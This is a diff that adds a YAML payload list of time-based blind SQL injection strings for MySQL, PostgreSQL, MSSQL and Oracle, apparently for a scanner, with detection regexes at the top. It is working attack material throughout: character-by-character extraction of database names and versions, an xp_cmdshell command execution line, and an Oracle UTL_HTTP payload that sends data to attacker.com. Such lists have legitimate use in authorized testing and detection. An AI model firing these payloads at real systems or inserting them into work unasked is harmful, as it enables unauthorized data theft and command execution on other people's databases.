@@ -1,0 +1,489 @@
+metadata:
+  type: sqli/time_based
+  version: "1.0"
+  description: "Time-based blind SQL injection payloads"
+  sources: ["OWASP", "SQLMap", "PayloadsAllTheThings"]
+
+detection_patterns:
+  - "sleep\\(\\d+\\)"
+  - "benchmark\\(\\d+"
+  - "waitfor\\s+delay"
+  - "pg_sleep"
+  - "dbms_pipe\\.receive_message"
+  - "generate_series"
+
+payloads:
+  mysql:
+    - value: "' AND SLEEP(5)-- -"
+      description: "MySQL SLEEP 5s"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "' AND SLEEP(10)-- -"
+      description: "MySQL SLEEP 10s"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "1 AND SLEEP(5)"
+      description: "Numeric SLEEP"
+      severity: high
+      tags: [time_based, sleep, numeric]
+
+    - value: "' OR SLEEP(5)-- -"
+      description: "OR SLEEP"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "') AND SLEEP(5)-- -"
+      description: "Parenthesis SLEEP"
+      severity: high
+      tags: [time_based, sleep, parenthesis]
+
+    - value: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+      description: "Subquery SLEEP"
+      severity: high
+      tags: [time_based, sleep, subquery]
+
+    - value: "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -"
+      description: "Derived table SLEEP"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "' AND SLEEP(5) AND '1'='1"
+      description: "SLEEP with condition"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "' AND (SELECT 5000 FROM (SELECT(SLEEP(5)))a)-- -"
+      description: "SLEEP with SELECT wrapper"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "'; SELECT SLEEP(5);-- -"
+      description: "Stacked SLEEP"
+      severity: high
+      tags: [time_based, sleep, stacked]
+
+    - value: "' AND BENCHMARK(10000000,SHA1('test'))-- -"
+      description: "BENCHMARK heavy computation"
+      severity: high
+      tags: [time_based, benchmark]
+
+    - value: "' AND BENCHMARK(50000000,SHA1('test'))-- -"
+      description: "BENCHMARK very heavy"
+      severity: high
+      tags: [time_based, benchmark]
+
+    - value: "1 AND BENCHMARK(10000000,SHA1('test'))"
+      description: "Numeric BENCHMARK"
+      severity: high
+      tags: [time_based, benchmark, numeric]
+
+    - value: "' OR BENCHMARK(10000000,SHA1('test'))-- -"
+      description: "OR BENCHMARK"
+      severity: high
+      tags: [time_based, benchmark]
+
+    - value: "'; SELECT BENCHMARK(10000000,SHA1('test'));-- -"
+      description: "Stacked BENCHMARK"
+      severity: high
+      tags: [time_based, benchmark, stacked]
+
+    - value: "' AND (SELECT * FROM (SELECT(BENCHMARK(10000000,SHA1('test'))))a)-- -"
+      description: "Subquery BENCHMARK"
+      severity: high
+      tags: [time_based, benchmark, subquery]
+
+    - value: "' WHERE 1=1 AND SLEEP(5)-- -"
+      description: "WHERE clause SLEEP"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "AND SLEEP(5)"
+      description: "Direct SLEEP no quote"
+      severity: high
+      tags: [time_based, sleep, no_quote]
+
+    - value: "SLEEP(5)"
+      description: "Raw SLEEP"
+      severity: high
+      tags: [time_based, sleep, no_quote]
+
+    - value: "'||(SELECT SLEEP(5) FROM DUAL WHERE 1=1)-- -"
+      description: "Concatenated SLEEP"
+      severity: high
+      tags: [time_based, sleep, concatenation]
+
+    - value: "' AND IF(1=1,SLEEP(5),0)-- -"
+      description: "Conditional IF+SLEEP true"
+      severity: high
+      tags: [time_based, sleep, conditional]
+
+    - value: "' AND IF(1=2,SLEEP(5),0)-- -"
+      description: "Conditional IF+SLEEP false"
+      severity: high
+      tags: [time_based, sleep, conditional]
+
+    - value: "' AND IF((SELECT database())='',SLEEP(5),0)-- -"
+      description: "IF+SLEEP database check"
+      severity: high
+      tags: [time_based, sleep, conditional]
+
+    - value: "' AND IF(LENGTH(database())>0,SLEEP(5),0)-- -"
+      description: "IF+SLEEP database length"
+      severity: high
+      tags: [time_based, sleep, conditional]
+
+    - value: "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -"
+      description: "IF+SLEEP character extraction"
+      severity: high
+      tags: [time_based, sleep, conditional, extraction]
+
+    - value: "1' AND SLEEP(5) AND '1'='1"
+      description: "String context SLEEP"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "1 AND SLEEP(5)-- -"
+      description: "Numeric param SLEEP"
+      severity: high
+      tags: [time_based, sleep, numeric]
+
+    - value: "(SELECT SLEEP(5))"
+      description: "SELECT SLEEP in parens"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "'; WAITFOR DELAY '0:0:5'-- -"
+      description: "WAITFOR in MySQL (some drivers)"
+      severity: medium
+      tags: [time_based, waitfor]
+
+  postgresql:
+    - value: "'; SELECT pg_sleep(5);--"
+      description: "pg_sleep 5s stacked"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--"
+      description: "pg_sleep conditional IS NOT NULL"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "' AND 1=(SELECT 1 FROM pg_sleep(5))--"
+      description: "pg_sleep in subquery"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "1; SELECT pg_sleep(5);--"
+      description: "Numeric pg_sleep stacked"
+      severity: high
+      tags: [time_based, pg_sleep, numeric]
+
+    - value: "' OR (SELECT 1 FROM pg_sleep(5))=1--"
+      description: "OR pg_sleep"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "'; SELECT pg_sleep_for('5 seconds');--"
+      description: "pg_sleep_for interval"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "'; SELECT pg_sleep(5);--"
+      description: "pg_sleep stacked simple"
+      severity: high
+      tags: [time_based, pg_sleep, stacked]
+
+    - value: "' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--"
+      description: "generate_series heavy query"
+      severity: high
+      tags: [time_based, heavy_query]
+
+    - value: "'; SELECT * FROM generate_series(1,5000000);--"
+      description: "generate_series stacked"
+      severity: high
+      tags: [time_based, heavy_query, stacked]
+
+    - value: "' AND (SELECT 1 FROM generate_series(1,5000000) WHERE 1=1) IS NOT NULL--"
+      description: "generate_series conditional"
+      severity: high
+      tags: [time_based, heavy_query]
+
+    - value: "' AND 1=(SELECT 1 FROM pg_sleep(5))--"
+      description: "pg_sleep comparison"
+      severity: high
+      tags: [time_based, pg_sleep]
+
+    - value: "1 AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL"
+      description: "Numeric pg_sleep"
+      severity: high
+      tags: [time_based, pg_sleep, numeric]
+
+    - value: "' AND CASE WHEN 1=1 THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END IS NOT NULL--"
+      description: "CASE WHEN pg_sleep"
+      severity: high
+      tags: [time_based, pg_sleep, conditional]
+
+    - value: "' AND CASE WHEN (SELECT current_database())='postgres' THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END IS NOT NULL--"
+      description: "Conditional pg_sleep database check"
+      severity: high
+      tags: [time_based, pg_sleep, conditional]
+
+    - value: "'; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS $$ BEGIN PERFORM pg_sleep($1); RETURN 1; END; $$ LANGUAGE plpgsql; SELECT sleep(5);--"
+      description: "Custom sleep function"
+      severity: high
+      tags: [time_based, pg_sleep, advanced]
+
+  mssql:
+    - value: "'; WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR DELAY 5s"
+      severity: high
+      tags: [time_based, waitfor]
+
+    - value: "' WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR inline"
+      severity: high
+      tags: [time_based, waitfor]
+
+    - value: "1; WAITFOR DELAY '0:0:5'--"
+      description: "Numeric WAITFOR"
+      severity: high
+      tags: [time_based, waitfor, numeric]
+
+    - value: "'; WAITFOR DELAY '0:0:05'--"
+      description: "WAITFOR zero-padded"
+      severity: high
+      tags: [time_based, waitfor]
+
+    - value: "'; WAITFOR DELAY '0:5:0'--"
+      description: "WAITFOR 5 minutes"
+      severity: high
+      tags: [time_based, waitfor]
+
+    - value: "' IF 1=1 WAITFOR DELAY '0:0:5'--"
+      description: "Conditional WAITFOR true"
+      severity: high
+      tags: [time_based, waitfor, conditional]
+
+    - value: "' IF 1=2 WAITFOR DELAY '0:0:5'--"
+      description: "Conditional WAITFOR false"
+      severity: high
+      tags: [time_based, waitfor, conditional]
+
+    - value: "' IF (SELECT COUNT(*) FROM sysdatabases)>0 WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR check database exists"
+      severity: high
+      tags: [time_based, waitfor, conditional]
+
+    - value: "' IF (SELECT LEN(@@version))>0 WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR version length check"
+      severity: high
+      tags: [time_based, waitfor, conditional]
+
+    - value: "' IF ASCII(SUBSTRING(@@version,1,1))>0 WAITFOR DELAY '0:0:5'--"
+      description: "WAITFOR ASCII extraction"
+      severity: high
+      tags: [time_based, waitfor, conditional, extraction]
+
+    - value: "'; DECLARE @q VARCHAR(8000); SET @q='WAITFOR DELAY ''0:0:5'''; EXEC(@q)--"
+      description: "EXEC WAITFOR dynamic"
+      severity: high
+      tags: [time_based, waitfor, dynamic]
+
+    - value: "'; EXEC xp_cmdshell 'ping -n 5 127.0.0.1'--"
+      description: "xp_cmdshell ping delay"
+      severity: critical
+      tags: [time_based, xp_cmdshell]
+
+    - value: "' WAITFOR DELAY '0:0:5' AND '1'='1"
+      description: "WAITFOR with condition"
+      severity: high
+      tags: [time_based, waitfor]
+
+    - value: "1 WAITFOR DELAY '0:0:5'"
+      description: "Direct WAITFOR numeric"
+      severity: high
+      tags: [time_based, waitfor, numeric]
+
+    - value: "'; WAITFOR DELAY '0:0:5'--"
+      description: "Stacked WAITFOR"
+      severity: high
+      tags: [time_based, waitfor, stacked]
+
+  oracle:
+    - value: "'; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;--"
+      description: "DBMS_PIPE 5s delay"
+      severity: high
+      tags: [time_based, dbms_pipe]
+
+    - value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      description: "DBMS_PIPE inline"
+      severity: high
+      tags: [time_based, dbms_pipe]
+
+    - value: "1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;--"
+      description: "Numeric DBMS_PIPE"
+      severity: high
+      tags: [time_based, dbms_pipe, numeric]
+
+    - value: "' AND DBMS_PIPE.RECEIVE_MESSAGE((SELECT banner FROM v$version WHERE ROWNUM=1),5) IS NOT NULL--"
+      description: "DBMS_PIPE with subquery"
+      severity: high
+      tags: [time_based, dbms_pipe, subquery]
+
+    - value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),5)--"
+      description: "DBMS_PIPE CHR encoded"
+      severity: high
+      tags: [time_based, dbms_pipe]
+
+    - value: "'; SELECT DBMS_LOCK.SLEEP(5) FROM DUAL;--"
+      description: "DBMS_LOCK.SLEEP (requires grants)"
+      severity: high
+      tags: [time_based, dbms_lock]
+
+    - value: "' AND DBMS_LOCK.SLEEP(5) IS NOT NULL--"
+      description: "DBMS_LOCK inline"
+      severity: high
+      tags: [time_based, dbms_lock]
+
+    - value: "'; BEGIN DBMS_SESSION.SLEEP(5); END;--"
+      description: "DBMS_SESSION.SLEEP (12c+)"
+      severity: high
+      tags: [time_based, dbms_session]
+
+    - value: "' AND 1=DBMS_SESSION.SLEEP(5)--"
+      description: "DBMS_SESSION inline"
+      severity: high
+      tags: [time_based, dbms_session]
+
+    - value: "' AND (SELECT COUNT(*) FROM all_objects WHERE object_name='X')>0 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--"
+      description: "Conditional DBMS_PIPE"
+      severity: high
+      tags: [time_based, dbms_pipe, conditional]
+
+    - value: "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END IS NOT NULL--"
+      description: "CASE WHEN DBMS_PIPE"
+      severity: high
+      tags: [time_based, dbms_pipe, conditional]
+
+    - value: "'; EXECUTE IMMEDIATE 'BEGIN DBMS_PIPE.RECEIVE_MESSAGE(''a'',5); END;';--"
+      description: "EXECUTE IMMEDIATE DBMS_PIPE"
+      severity: high
+      tags: [time_based, dbms_pipe, dynamic]
+
+    - value: "' AND DBMS_PIPE.RECEIVE_MESSAGE(0,5)=0--"
+      description: "DBMS_PIPE numeric key"
+      severity: high
+      tags: [time_based, dbms_pipe]
+
+    - value: "' AND UTL_HTTP.REQUEST('http://attacker.com/'||SYSTIMESTAMP) IS NOT NULL--"
+      description: "UTL_HTTP DNS exfil"
+      severity: high
+      tags: [time_based, utl_http]
+
+    - value: "' AND DBMS_PIPE.RECEIVE_MESSAGE((SELECT user FROM DUAL),5) IS NOT NULL--"
+      description: "DBMS_PIPE user-based pipe"
+      severity: high
+      tags: [time_based, dbms_pipe]
+
+  generic:
+    - value: "' OR SLEEP(5)--"
+      description: "Generic OR SLEEP"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' OR pg_sleep(5)--"
+      description: "Generic OR pg_sleep"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' WAITFOR DELAY '0:0:5'--"
+      description: "Generic WAITFOR"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' OR BENCHMARK(10000000,SHA1('test'))--"
+      description: "Generic OR BENCHMARK"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "1 OR SLEEP(5)"
+      description: "Numeric OR SLEEP"
+      severity: high
+      tags: [time_based, polyglot, numeric]
+
+    - value: "1 OR BENCHMARK(10000000,SHA1('test'))"
+      description: "Numeric OR BENCHMARK"
+      severity: high
+      tags: [time_based, polyglot, numeric]
+
+    - value: "'; SELECT SLEEP(5);--"
+      description: "Generic stacked SLEEP"
+      severity: high
+      tags: [time_based, polyglot, stacked]
+
+    - value: "'; SELECT pg_sleep(5);--"
+      description: "Generic stacked pg_sleep"
+      severity: high
+      tags: [time_based, polyglot, stacked]
+
+    - value: "'; WAITFOR DELAY '0:0:5';--"
+      description: "Generic stacked WAITFOR"
+      severity: high
+      tags: [time_based, polyglot, stacked]
+
+    - value: "' AND SLEEP(5) AND '1'='1"
+      description: "Conditional SLEEP context break"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "SLEEP(5)"
+      description: "Raw SLEEP"
+      severity: high
+      tags: [time_based, polyglot, no_quote]
+
+    - value: "BENCHMARK(10000000,SHA1('test'))"
+      description: "Raw BENCHMARK"
+      severity: high
+      tags: [time_based, polyglot, no_quote]
+
+    - value: "pg_sleep(5)"
+      description: "Raw pg_sleep"
+      severity: high
+      tags: [time_based, polyglot, no_quote]
+
+    - value: "-1 OR SLEEP(5)"
+      description: "Negative ID SLEEP"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "0 OR SLEEP(5)"
+      description: "Zero ID SLEEP"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "' AND 1=IF(1=1,SLEEP(5),0)--"
+      description: "IF conditional SLEEP"
+      severity: high
+      tags: [time_based, polyglot, conditional]
+
+    - value: "' OR IF(1=1,SLEEP(5),0)--"
+      description: "OR IF SLEEP"
+      severity: high
+      tags: [time_based, polyglot, conditional]
+
+    - value: "'; WAITFOR DELAY '0:0:5'--"
+      description: "Semicolon WAITFOR"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "1;WAITFOR DELAY '0:0:5'"
+      description: "No comment WAITFOR"
+      severity: high
+      tags: [time_based, polyglot]
+
+    - value: "'||SLEEP(5)||'"
+      description: "Concatenated SLEEP"
+      severity: high
+      tags: [time_based, polyglot, concatenation]
